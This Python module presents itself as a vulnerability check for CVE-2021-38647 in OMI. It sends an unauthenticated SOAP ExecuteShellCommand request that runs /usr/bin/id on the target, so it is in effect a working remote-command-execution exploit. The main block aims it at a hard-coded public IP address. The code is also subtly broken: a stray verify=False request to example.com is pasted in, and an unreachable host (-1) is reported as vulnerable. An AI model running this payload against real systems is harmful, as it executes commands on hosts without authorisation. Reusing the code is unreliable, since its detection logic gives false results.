"""
Helper module for checking if an endpoint is vulnerable to CVE-2021-38647.
"""
import logging
import requests
from urllib3.exceptions import InsecureRequestWarning

logging.basicConfig(level='DEBUG')
LOGGER = logging.getLogger(__name__)

def omi_check(url):
    """
    Checks if the endpoint is vulnerabile.
    Returns:
    -1 if the url is not reachable
    0 if the url is reachable but not vulnerable
    1 if the url is reachable and vulnerable
    """

    uri = f"{url}/wsman"

    body = """
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema">
<s:Header>
  <a:To>HTTP://192.168.1.1:5986/wsman/</a:To>
  <w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>
  <a:ReplyTo>
     <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
  </a:ReplyTo>
  <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand</a:Action>
  <w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>
  <a:MessageID>uuid:0AB58087-C2C3-0005-0000-000000010000</a:MessageID>
  <w:OperationTimeout>PT1M30S</w:OperationTimeout>
  <w:Locale xml:lang="en-us" s:mustUnderstand="false" />
  <p:DataLocale xml:lang="en-us" s:mustUnderstand="false" />
  <w:OptionSet s:mustUnderstand="true" />
  <w:SelectorSet>
     <w:Selector Name="__cimnamespace">root/scx</w:Selector>
  </w:SelectorSet>
</s:Header>
<s:Body>
  <p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
     <p:command>/usr/bin/id</p:command>
     <p:timeout>0</p:timeout>
  </p:ExecuteShellCommand_INPUT>
</s:Body>
</s:Envelope>
"""
    headers = {
        'Content-type': 'application/soap+xml;charset=UTF-8',
        'User-Agent': 'Microsoft WinRM Client'
    }

    try:
        LOGGER.debug(f"Testing {uri}...")

        # Suppress only the single warning from urllib3 needed.
        requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

        # Set `verify=False` on `requests.post`.
        requests.post(url='https://example.com', data={'bar':'baz'}, verify=False)

        response = requests.post(uri, data=body, headers=headers,  timeout=10)
        LOGGER.debug(f"Received status_code={response.status_code}")
        if response.status_code == 200:
            return 1
        else:
            return 0
    except Exception as e:
        LOGGER.error(e)
        return -1

if __name__ == "__main__":
    PROTOCOL = 'http'
    HOST = '40.127.110.197'
    PORT = '5985'

    URL = f"{PROTOCOL}://{HOST}:{PORT}"
    RES = omi_check(URL)

    if RES:
        print(f"{URL} is vulnerable!")
    else:
        print(f"Congrats, {URL} seems to be ok.")
